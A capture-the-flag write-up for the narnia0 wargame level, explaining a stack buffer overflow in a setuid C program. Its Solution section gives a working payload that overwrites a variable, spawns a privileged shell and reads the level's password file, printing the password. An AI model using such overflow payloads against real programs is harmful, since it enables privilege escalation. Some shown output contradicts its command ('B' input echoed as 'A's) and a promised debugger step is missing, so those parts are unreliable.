Introduction
============

There are to files related to this level.
The first one is named ```/narnia/narnia0```. It's a [setuid](https://en.wikipedia.org/wiki/Setuid) binary which we obviously have to [exploit](https://en.wikipedia.org/wiki/Exploit_(computer_security)) in order to gain access to the next level:

```
narnia0@narnia:~$ ls -al /narnia/narnia0
-r-sr-x--- 1 narnia1 narnia0 7460 Oct 23 04:22 /narnia/narnia0
```

The other file which is related to this level is a [C](https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FC_(programming_language)&usg=AOvVaw3vI8WzyDIw4n3m42_eXFeI source code) file which intention is to explain us the internal workflow of the binary ```/narnia/narnia0```:

```
narnia0@narnia:~$ cat /narnia/narnia0.c

#include <stdio.h>
#include <stdlib.h>

int main(){
	long val=0x41414141;
	char buf[20];

	printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
	printf("Here is your chance: ");
	scanf("%24s",&buf);

	printf("buf: %s\n",buf);
	printf("val: 0x%08x\n",val);

	if(val==0xdeadbeef)
		system("/bin/sh");
	else {
		printf("WAY OFF!!!!\n");
		exit(1);
	}

	return 0;
}
```

When looking at the code we can see that there are two variables. One is named ```val``` and has a value of ```0x41414141``` already assigned. The other one is a char array named ```buf``` with a size of 20 bytes. After two lines of informational output using ```printf()``` there is a call to ```scanf()``` which reads in 24 bytes and stores them into the char array ```buf[20]```. Or in other words: when the program is executed, the user can input more data than the input buffer can handle. That's a so-called [Buffer Overflow](https://en.wikipedia.org/wiki/Buffer_overflow). More precisely it's a so-called [Stack Overflow](https://en.wikipedia.org/wiki/Stack_buffer_overflow) which has first and foremost been described by a hacker named Aleph One in his legendary article [Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html).

The aim of ```/narnia/narnia0``` is to input the right amount and type of data in order to overflow the char buffer ```buf[20]``` and therefore overwrite the value of ```0x41414141``` which is stored in the variable ```val``` to the new value of ```0xdeadbeef```. 
If this has been achieved, a new shell is opened with the access rights of the next level's user ```narnia1```. This will let us execute additional commands in order to gain narnia1's password.


Theory
======

Let's start with some theory first in order to understand [Stack based Buffer Overflows](https://en.wikipedia.org/wiki/Stack_buffer_overflow) and the [x86 architecture](https://en.wikipedia.org/wiki/X86). Both is required to successfully overflow the buffer with reasonable data in order to modify the program's workflow. Speaking of *reasonable* data, modern computer systems include some techniques to prevent and/or reduce the risk of buffer overflows. But since the narnia wargame doesn't use any [stack protection techniques](https://unix.stackexchange.com/questions/66802/disable-stack-protection-on-ubuntu-for-buffer-overflow-without-c-compiler-flags) we don't have to care about this right now. 

As mentioned before, the hardware platform where the narnia wargame is running on is x86. More precisely it's [x86_64](https://en.wikipedia.org/wiki/X86-64). Let's see if that's true:

```
narnia0@narnia:~$ uname -i
x86_64
```

The operating system of the narnia wargame is [Linux](https://en.wikipedia.org/wiki/Linux), of course this can be checked as well:

```
narnia0@narnia:~$ uname -o
GNU/Linux
```

And since we are already in the process of gathering required information about our target, let's determine some more details about the setuid binary file named ```/narnia/narnia0``` which we later want to exploit: 

```
narnia0@narnia:~$ file /narnia/narnia0
/narnia/narnia0: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=dd54e629928af495112df911bb651846c281d5d8, not stripped
```

As we can see it's a 32-bit compiled Linux [ELF](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format) binary [executable](https://en.wikipedia.org/wiki/Executable) file which is [dynamically linked](https://stackoverflow.com/questions/311882/what-do-statically-linked-and-dynamically-linked-mean) and is [not stripped](https://unix.stackexchange.com/questions/2969/what-are-stripped-and-not-stripped-executables-in-unix). This means that we can let it run inside of a [debugger](https://en.wikipedia.org/wiki/Debugger) or a similar analyzis tools in order to take a look into the program's internals and/or to understand its workflow compared to the source code.


Preparation
===========

After some basic grey theory let's start with some experiments in order to learn and understand more required theory as well introducing useful tools and techniques.

We start by executing the binary ```/narnia/narnia0``` for the first time. As we already have analyzed, the program let's you enter arbitrary text that gets stored in a buffer that has a size of 20 bytes. Let's start doing this with less than 20 characters just to see what happens. 
Since we are too lazy to (repeatedly) type 10 or more characters, we [pipe](https://en.wikipedia.org/wiki/Pipeline_(Unix)) our input into the program's [```STDIN```](https://en.wikipedia.org/wiki/Standard_streams) using some [Python](https://en.wikipedia.org/wiki/Python_(programming_language)) magic:

```
narnia0@narnia:~$ python -c 'print "B"*10' | /narnia/narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAA
val: 0x41414141
WAY OFF!!!!
```

What we can see ist that the char array ```buf[20]``` now contains 10 times the letter 'B' while the value of variable ```val``` remains 0x41414141. That's what we expected so far. 
Just a side note: The term ```0x41``` has a special meaning in cyber security. 0x41 is the [hexadecimal](https://en.wikipedia.org/wiki/Hexadecimal) representation of the letter 'A' as described in the [ASCII](https://en.wikipedia.org/wiki/ASCII) character encoding standard. The letter 'A' or its hexadecimal expression 0x41 are used to fill buffers in order to analyze a program's flow like we previously did. Using an 'A' or 0x41 is just some kind of a [convention](https://security.stackexchange.com/questions/18680/why-is-0x41414141-associated-with-security-exploits) because people found out that filling buffers with a sequence of identical characters simplifies looking for them in process memory later on. Since the pre-assigned value of ```val``` already contains a sequence of A's and therefore a sequence of 0x41's, we decided to fill the buffer ```buf``` with a sequence of the letter 'B' which is 0x42 in hexadecimal. This enables us to differenciate between the contents of the variable ```val``` and the contents of buffer ```buf[20]```. Let's open the program in the GNU Debugger (gdb) in order to visualize this behavior:



The expectation is that if we enter exactely these 20 characters, the buffer ```buf[20]``` gets filled with the characters and everything is fine.

narnia0@narnia:~$ python -c 'print "A"*20' | /narnia/narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAA
val: 0x41414100
WAY OFF!!!!


Solution
========

```
narnia0@narnia:~$ (echo -n -e "AAAAAAAAAAAAAAAAAAAA\\xef\\xbe\\xad\\xde";cat) | /narnia/narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
id
uid=14000(narnia0) gid=14000(narnia0) euid=14001(narnia1) groups=14001(narnia1),14000(narnia0)
cat /etc/narnia_pass/narnia1
efeidiedae
```
